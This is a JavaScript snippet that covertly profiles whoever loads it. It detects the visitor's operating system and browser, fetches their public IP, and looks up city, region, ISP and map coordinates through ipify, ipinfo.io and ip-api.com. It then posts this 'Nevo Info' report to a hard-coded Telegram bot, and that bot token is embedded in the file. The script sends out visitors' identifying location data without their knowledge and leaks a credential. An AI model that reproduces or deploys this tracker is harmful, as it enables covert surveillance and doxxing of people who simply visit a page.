let mach = ''; // Device type placeholder
let nav = ''; // Browser type placeholder
let timezone = ''; // Timezone placeholder

// Determine device type
if (navigator.userAgent.indexOf('Windows') !== -1) {
    mach = 'Windows';
} else if (navigator.userAgent.indexOf('Ubuntu') !== -1) {
    mach = 'Ubuntu';
} else if (navigator.userAgent.indexOf('Kali') !== -1) {
    mach = 'Kali';
} else if (navigator.userAgent.indexOf('Android') !== -1) {
    mach = 'Android';
} else if (navigator.userAgent.indexOf('iPhone') !== -1 || navigator.userAgent.indexOf('iPad') !== -1) {
    mach = 'iOS';
} else {
    mach = 'Other';
}

// Determine browser type
if (navigator.userAgent.indexOf('Chrome') !== -1) {
    nav = 'Chrome';
} else if (navigator.userAgent.indexOf('Safari') !== -1) {
    nav = 'Safari';
} else if (navigator.userAgent.indexOf('Edge') !== -1) {
    nav = 'Edge';
} else if (navigator.userAgent.indexOf('Firefox') !== -1) {
    nav = 'Mozilla';
} else if (navigator.userAgent.indexOf('Opera') !== -1) {
    nav = 'Opera';
} else if (navigator.userAgent.indexOf('Tor') !== -1) {
    nav = 'Tor';
} else {
    nav = 'Other';
}

// Get client IP
let publicIP = '';

fetch('https://api64.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        publicIP = data.ip;

        // Get geolocation data
        fetch(`https://ipinfo.io/${publicIP}/geo`)
            .then(response => response.json())
            .then(json1 => {
                fetch(`http://ip-api.com/json/${publicIP}?fields=query,continent,country,countryCode,regionName,city,zip,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting`)
                    .then(response => response.json())
                    .then(json => {
                        const loc = json1.loc;
                        const country = `${json1.countryCode}, ${json.regionName}, ${json.city}`;
                        const zip = json.isp;
                        timezone = json.timezone;

                        // Telegram message construction
                        const msg = `-----{===--{ Nevo Info }--===}-----\n\nYour IP : ${publicIP}\n\nYour APP & Device : ${mach}/${nav}\n\nYour address : ${country}\n\nYour Provider : ${zip}\n\nYour Location : http://www.google.com/maps/place/${loc}\n\nYour Time Now Is :${timezone}\n\n-----{===--{ Nevo Info }--===}-----`;

                        // Telegram API endpoint and data
                        const bot_id = "-1001874783762"; // Your Telegram bot ID
                        const url = 'https://api.telegram.org/bot6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY/sendMessage'; // Replace <YourBotToken> with your actual bot token

                        const data = {
                            chat_id: bot_id,
                            text: msg
                        };

                        const options = {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        };

                        fetch(url, options)
                            .then(response => response.json())
                            .then(result => console.log(result))
                            .catch(error => console.error('Error:', error));
                    })
                    .catch(error => console.error('Error:', error));
            })
            .catch(error => console.error('Error:', error));
    })
    .catch(error => console.error('Error:', error));
